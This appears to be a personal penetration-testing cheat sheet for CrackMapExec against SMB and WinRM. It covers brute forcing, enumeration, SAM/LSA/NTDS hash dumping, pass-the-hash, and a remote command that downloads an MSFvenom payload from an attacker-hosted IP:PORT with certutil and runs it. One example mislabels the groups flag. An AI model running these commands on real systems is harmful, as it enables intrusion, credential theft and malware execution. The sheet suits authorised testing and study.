--- ---

<h2>Main Purpose</h2>

CME provides a framework for running various external tools, including Mimikatz, Metasploit Shell, ...

Top Utility
	SMV             ---> Own stuff using SMB
    LDAP            ---> Own stuff using LDAP
    MSSQL         ---> Own stuff using MSSQL
    SSH              --->  Own stuff using SSH
    WINRM          ---> Own stuff using WINRM
    Many more utilities...









---

<h2>General Commands</h2>

Commands
```
# Module
crackmapexec smb -L                         ---> List all the available modules
crackmapexec smb -m MODULE --options        ---> Print the options for the module
crackmapexec smb IP -u 'USER' -p'PASS' -m MODULE ---> Use the module






# Options
-t THREADS            set how many concurrent threads to use (default: 100)
--timeout TIMEOUT     max timeout in seconds of each thread (default: None)
--jitter INTERVAL     sets a random delay between each connection (default: None)
--darrell             give Darrell a hand
--verbose             enable verbose output
```

---

<h2>SMB</h2>

Command (Connection)
```
crackmapexec smb IP -u '' -p ''
```

- -u                                           ---> Username
- -p                                           ---> Passowrd

Trying **NULL** and **guest** username to login are a good thing to test when trying to connect to a target via SMB


Command (Brute Force)
```
crackmapexec smb IP -u USERNAMES.txt -p PASSWORD.txt --continue-on-success
```

- -u                                           ---> Usernames
- -p                                           ---> Passowrds
- --continue-on-success        ---> Continue enumaration after finding one valid user

Domain admin will be flag with the keyword <font color="orange">(Pwn3d!)</font>


Command (Shares Enumeration)
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u '' -p '' --shares
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --shares                                 ---> Enumerate shares access (Show folders & permissions)


Command (User Enumeration)
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u 'Valid-User' -p 'Valid-Pass' --users
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --users                                   ---> Command to list users


Command (Groups Enumeration)
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u 'Valid-User' -p 'Valid-Pass' --users
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --groups                                ---> Command to list groups


Command (Password Policy (length))
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u '' -p '' --pass-pol
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --pass-pol                             ---> Check the password policy (length)


Command (Check Current log-on sessions)
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u 'Valid-User' -p 'Valid-Pass' --sessions
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --sessions                             ---> Command to list current sessions


Command (Dump Hash | sam, lsa, ntds)
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u 'Valid-User' -p 'Valid-Pass' --ntds
```

- -u                                           ---> Username
- -p                                           ---> Passowrd
- --ntds                                    ---> Type of Hash (can use sam, lsa or ntds)

Difference between those elements
	The `SAM` file is a database that stores information about local user accounts on a Windows system. It is used to authenticate local users on the system and is typically stored on the system drive in the `%SYSTEMROOT%\system32\config` directory. Stores information about user accounts on a local computer, including their passwords and security identifiers (**SIDs**)
	ㅤ
	The `LSA` is a component of the Windows operating system that is responsible for handling security requests. It is responsible for authenticating users, granting access to resources, and enforcing security policies. The LSA is not a standalone file, but rather a component of the operating system.
	ㅤ
	The `NTDS` file is a database that stores information about objects in an Active Directory domain, including users, groups, and computers. It is used to authenticate users in an Active Directory domain and is typically stored on the system drive in the `%SYSTEMROOT%\NTDS` directory.



Command (Run Custom Command (Example MSFvenom payload))
```
# Take note you need a valid account to perform the following
crackmapexec smb IP -u 'Valid-User' -p 'Valid-Pass' -x 'certutil -urlcache -f http://IP:PORT/PAYLOAD_NAME.exe payload_name.exe && cmd /c payload_name.exe'
``````

- -u                                           ---> Username
- -p                                           ---> Passowrd
- -x                                           ---> Command to run on the machine
	- IP:PORT                          ---> Port we are hosting the payload
	- cmd /c                            ---> Run the command (program)


Pass the Hash
```
crackmapexec smb IP -u USERNAME -H 32196B56FFE6F45E294117B91A83BF38 -x COMMAND
```
  ---> More information: [[3 - Authentication Relays (Responder)]]

---

<h2>Winrm</h2>

Command
```
# Brute Force
crackmapexec winrm IP -u 'administator' -p 'WORDLIST'

# Sign In testing and Commands
crackmapexec winrm IP -u 'USER' -p 'PASS' -x "ipconfig"
```

- Possible to brute force it or simply check if a credential is valid
- Possible to send command with valid credential

Check [[• Evil Winrm]] for the following of the exploitation


---

<h2>More Information</h2>

More information ---> https://wiki.porchetta.industries/

<iframe src="https://wiki.porchetta.industries/" width="100%" height="1300"></iframe>